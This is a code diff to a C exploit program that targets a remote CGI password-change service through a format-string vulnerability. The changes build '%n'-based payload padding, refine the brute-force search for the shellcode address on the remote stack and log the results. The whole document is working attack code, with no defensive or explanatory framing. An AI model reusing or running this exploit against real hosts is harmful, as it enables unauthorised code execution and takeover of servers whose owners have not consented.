@@ -116,6 +116,7 @@ log_result (char * fmt, ...)
 		return;
 	}
 
+	fprintf (fp, "%s - ", Date);
 	va_start (ap, fmt);
 	vfprintf (fp, fmt, ap);
 	va_end (ap);
@@ -143,6 +144,7 @@ print_result_as_ascii (char * result)
 		}
 	}
 	printf ("\n");
+	fflush (stdout);
 }
 
 int
@@ -212,8 +214,20 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 	}
 
 	ptr = &buffer[strlen (buffer)];
+	/* ADDR */
 	memcpy (ptr, &addr, sizeof (addr));
 	ptr[4] = '\0';
+
+	/* 
+	 * Filling with some bytes to simulate the 
+	 * final string in exploitation: 
+	 * <addr  >AAAA
+	 * <addr-1>AAAA
+	 * <addr-2>AAAA
+	 * <addr-3>AAAA|<eating stack..>|%n%xu%n%xu%n%xu%n|
+	 */
+
+	strncat (buffer, "BBBBADDRCCCCADDRDDDD", maxlen);
 
 	for (i = 0; i < stack_height; i++) {
 		strncat (buffer, ".%08x", maxlen);
@@ -261,7 +275,7 @@ post_chpasswd_user (char *ip, int port, char * cgi_path, char * user,
 	char tmp[8192];
 	int fd;
 	int n;
-	int tot_out_len;
+  	int tot_out_len;
 
 	fd = net_tcp_nonblock_connect (ip, port, 60);
 	 if (fd < 0) {
@@ -478,11 +492,17 @@ main (int argc, char ** argv)
 					continue;
 				}
 
+				endPtr += 4;
+
 				if ((endPtr - ptr) < (shellcode_size-20)) {
 					step = -16;
 
 					printf (">> &Shellcode found: %s shellcode address: 0x%08x. Finding first byte... (%d of %d)bytes\n", host, expect_shellcode_addr, (endPtr - ptr), shellcode_size);
-					expect_shellcode_addr = expect_shellcode_addr + step;
+
+					//expect_shellcode_addr = expect_shellcode_addr + step;
+
+					expect_shellcode_addr -= (shellcode_size-20) - (endPtr - ptr);
+					sleep (1);
 					continue;
 				}
 				
@@ -506,9 +526,9 @@ main (int argc, char ** argv)
 	
 	printf ("\n\n");
 	printf (">> Partial exploit result:\n");
-	printf (">> Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+	printf (">> Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
 
-	log_result ("Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+	log_result ("Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
 
 	printf ("Brute forcing remote return address into stack...\n");
 
